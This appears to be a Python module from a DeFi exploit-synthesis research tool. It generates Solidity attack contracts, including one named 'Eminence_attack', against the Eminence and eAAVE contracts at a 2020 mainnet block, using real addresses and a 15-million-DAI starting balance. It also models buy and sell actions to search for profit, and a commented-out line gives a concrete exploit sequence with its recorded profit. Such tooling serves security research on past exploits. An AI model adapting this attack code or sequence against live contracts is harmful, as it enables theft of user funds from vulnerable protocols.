import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class EminenceAction():
    initialStates = [1362803143, 14753434, 318070, 101168899]
    globalStates = initialStates.copy()
    #[0]: Eminence total supply
    #[1]: Eminence Reserve balance
    #[2]: eAAVE total supply
    #[3]: eAAVE Reserve balance

    startStr_contract = """// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/EminenceI.sol";
//Block 10954411
//Block index 3
//Timestamp Tue, 29 Sep 2020 01:20:41 +0000
//Gas price 555 gwei
//Gas limit 3568167

contract Eminence_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapDAI2ETHAddress = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant EminenceAddress = 0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8;
    address private constant eAAVEAddress = 0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    EminenceCurrency Eminence = EminenceCurrency(EminenceAddress);
    IERC20 DAI = IERC20(DAIAddress);
    EminenceCurrency eAAVE = EminenceCurrency(eAAVEAddress);

    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);
    uint256 borroweddDAI = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";

    constructor() payable {
        DAI.approve(EminenceAddress, 2 ** 256 - 1);
        Eminence.approve(eAAVEAddress, 2 ** 256 - 1);
        EOA = msg.sender;
        // loan amount: 1500,0000 DAI 
        //  ---------------------------------------------------------------------------------------------------------------------
    }

    receive() external payable {}
"""

    startStr_attack = """
    function attack( $$_$$ ) public {
"""

    endStr_attack = """
        revert(ProfitSummary());
    }
    """

    endStr_contract = """
    function ProfitSummary() internal returns (string memory _uintAsString)
    {
        uint256 balance1 = DAI.balanceOf(address(this)) / 10 ** 18;
        return append("DAI balance: ", uint2str(balance1));
    }


    function EminenceTotalSupply() internal returns (string memory _uintAsString) {
        uint256 totalSupply = Eminence.totalSupply() / 10 ** 18;
        str89 = append("Eminence Total Supply: ", uint2str(totalSupply));
        return str89;
    }

    function EminenceSummary() internal returns (string memory _uintAsString) {
        uint256 totalSupply = Eminence.totalSupply() / 10 ** 18;
        uint256 reserveBalance = Eminence.reserveBalance() / 10 ** 18;
        str89 = append("Eminence Total Supply: ", uint2str(totalSupply));
        str90 = append(" Eminence Reserve Balance: ", uint2str(reserveBalance));
        return append(str89, str90);
    }

    function eAAVESummary() internal returns (string memory _uintAsString){
        uint totalSupply = eAAVE.totalSupply() / 10 ** 18;
        uint256 reserveBalance = eAAVE.reserveBalance() / 10 ** 18;
        str89 = append("eAAVE Total Supply: ", uint2str(totalSupply));
        str90 = append(" eAAVE Reserve Balance: ", uint2str(reserveBalance));
        return append(str89, str90);
    }

    // below: helper functions

    function uint2str(uint256 _i)
    internal
    pure
    returns (string memory _uintAsString)
    {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b)
    internal
    pure
    returns (string memory){
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}

                """
    
    initialBalances = {"DAI": 15000000.0}
    currentBalances = {"DAI": 15000000.0}
    TargetTokens = {"DAI"}
    TokenPrices = {"DAI": 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1 or stats[0] == 20:
            return 0
        profit = stats[0] - 15000000
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = EminenceBuy
        action2 = EminenceSell
        action3 = eAAVEBuy
        action4 = eAAVESell

        action_list_1 = [action1, action2, action3, action4]

        action1_prestate_dependency = [action2, action3, action4]
        action2_prestate_dependency = [action1, action3, action4]
        action3_prestate_dependency = [action1, action2, action4]
        action4_prestate_dependency = [action1, action2, action3]
        
        # seq of actions
        ActionWrapper = EminenceAction
        action_lists = [action1_prestate_dependency + [action1], 
                        action2_prestate_dependency + [action2],
                        action3_prestate_dependency + [action3],
                        action4_prestate_dependency + [action4]]

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return

class EminenceBuy(EminenceAction):
    points = []
    values = [[], [], []]
    # Eminence Total Supply
    # Eminence DAI balance
    # Eminence received

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ["DAI"]
    tokensOut = ["EMN"]
    range = [0, 18000000]  # 15000000

    @classmethod
    def actionStr(cls):
        action = "      // Action: EminenceBuy\n"
        action += '''       Eminence.buy($$ * 10 ** 18, 0);\n''' 
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: EminenceBuy\n"
        action += '''        str1 = EminenceSummary();
        uint EMNgot = Eminence.balanceOf(address(this));
        Eminence.buy($$ * 10 ** 18, 0);
        EMNgot = ( Eminence.balanceOf(address(this)) - EMNgot ) / 10 ** 18;
        str2 = EminenceSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(EMNgot))));\n''' 
        return action


    @classmethod
    def string(cls):
        return "EminenceBuy"

    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)  
        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) 
        cls.values[1].append(v1)
        cls.values[2].append(v2) 
        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        
        return output0, output1, output2


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
    
        cls.currentBalances["DAI"] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] += output2
        cls.globalStates[1] += input

        if "EMN" not in cls.currentBalances:
            cls.currentBalances["EMN"] = output2
        else:
            cls.currentBalances["EMN"] += output2
        return

class EminenceSell(EminenceAction):
    points = []
    values = [[], [], []]
    # Eminence Total Supply
    # Eminence DAI balance
    # DAI received
    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ["EMN"]
    tokensOut = ["DAI"]
    range = [0, 800000000]  # 691825807

    @classmethod
    def actionStr(cls):
        action = "      // Action: EminenceSell\n"
        action += '''      Eminence.sell($$ * 10 ** 18, 0);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: EminenceSell\n"
        action += '''        str1 = EminenceSummary();
        uint DAIgot = DAI.balanceOf(address(this));

        Eminence.sell($$ * 10 ** 18, 0);
        
        DAIgot = ( DAI.balanceOf(address(this)) - DAIgot ) / 10 ** 18;
        str2 = EminenceSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(DAIgot))));\n'''
        return action

    @classmethod
    def string(cls):
        return "EminenceSell"

    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1
        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)  
        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) 
        cls.values[1].append(v1)
        cls.values[2].append(v2) 
        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2


    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances["EMN"] -= input
        output0, output1, output2 = cls.simulate(input)
        cls.globalStates[0] -= input
        cls.globalStates[1] -= output2
        cls.currentBalances["DAI"] += output2

class eAAVEBuy(EminenceAction):
    points = []
    values = [[], [], [], []]
    # eAAVE Total Supply
    # eAAVE Reserve Balance
    # Eminence Total Supply
    # eAAVE out
    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None

    numInputs = 1
    tokensIn = ["EMN"]
    tokensOut = ["eAAVE"]
    range = [0, 800000000]  # 691825807

    @classmethod
    def actionStr(cls):
        action = "      // Action: eAAVEBuy\n"
        action += '''       eAAVE.buy($$ * 10 ** 18, 0);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: eAAVEBuy\n"
        action += '''        str1 = eAAVESummary();
        str2 = EminenceTotalSupply();
        uint eAAVEgot = eAAVE.balanceOf(address(this));

        eAAVE.buy($$ * 10 ** 18, 0);
        
        eAAVEgot = ( eAAVE.balanceOf(address(this)) - eAAVEgot ) / 10 ** 18;
        str3 = eAAVESummary();
        str4 = EminenceTotalSupply();
        revert(appendWithSpace(str1, appendWithSpace(str2, appendWithSpace(str3, appendWithSpace(str4, uint2str(eAAVEgot))))));
'''
        
        return action     
        
    @classmethod
    def string(cls):
        return "eAAVEBuy"

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)  
        v0, v1, v2, v3 = cls.aliquotValues(values)

        cls.values[0].append(v0) 
        cls.values[1].append(v1)
        cls.values[2].append(v2)
        cls.values[3].append(v3)

        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])        
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[2], cls.globalStates[3], cls.globalStates[0],  input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        return output0, output1, output2, output3
    

    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        
        cls.currentBalances["EMN"] -= input

        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[2] = output0
        cls.globalStates[3] = output1

        cls.globalStates[0] -= input

        if "eAAVE" not in cls.currentBalances:
            cls.currentBalances["eAAVE"] = output3
        else:
            cls.currentBalances["eAAVE"] += output3


class eAAVESell(EminenceAction):
    points = []
    values = [[], [], [], []]
    # eAAVE Total Supply
    # eAAVE Reserve Balance
    # Eminence Total Supply
    # EMN out
    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None

    numInputs = 1
    range = [0, 600000]  # 572431
    tokensIn = ["eAAVE"]
    tokensOut = ["EMN"]

    @classmethod
    def actionStr(cls):
        action = "      // Action: eAAVESell\n"
        action += '''       eAAVE.sell($$ * 10 ** 18, 0);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: eAAVESell\n"
        action += '''        str1 = eAAVESummary();
        str2 = EminenceTotalSupply();
        uint EMNgot = Eminence.balanceOf(address(this));
        
        eAAVE.sell($$ * 10 ** 18, 0);

        EMNgot = ( Eminence.balanceOf(address(this)) - EMNgot) / 10 ** 18;
        str3 = eAAVESummary();
        str4 = EminenceTotalSupply();
        revert(appendWithSpace(str1, appendWithSpace(str2, appendWithSpace(str3, appendWithSpace(str4, uint2str(EMNgot))))));
'''
        return action    

    @classmethod
    def string(cls):
        return "eAAVESell"

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]   
        if point in cls.points:
            return -2

        cls.points.append(point)  

        v0, v1, v2, v3 = cls.aliquotValues(values)
        cls.values[0].append(v0) 
        cls.values[1].append(v1)
        cls.values[2].append(v2) 
        cls.values[3].append(v3)
        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[2], cls.globalStates[3], cls.globalStates[0], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)        

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances["eAAVE"] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[2] += input
        cls.globalStates[3] -= output3
        cls.globalStates[0] += output3
        cls.currentBalances["EMN"] += output3




def main():
    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 140000
    config.blockNum = 10954411
    config.contract_name = "Eminence_attack"
    
# Test for initial pass of data collecton: 
    EminenceAction.initialPass()
    # EminenceAction.runinitialPass()

    # action1 = EminenceBuy
    # action2 = EminenceSell
    # action3 = eAAVEBuy
    # action4 = eAAVESell
    # action_list = [action1, action3, action2, action4, action2]
    # initial_guess = [15000000, 691825807, 691825807, 572431, 691825227]

    # ActionWrapper = EminenceAction
    
    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 1674278
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4


if __name__ == "__main__":
    main()
    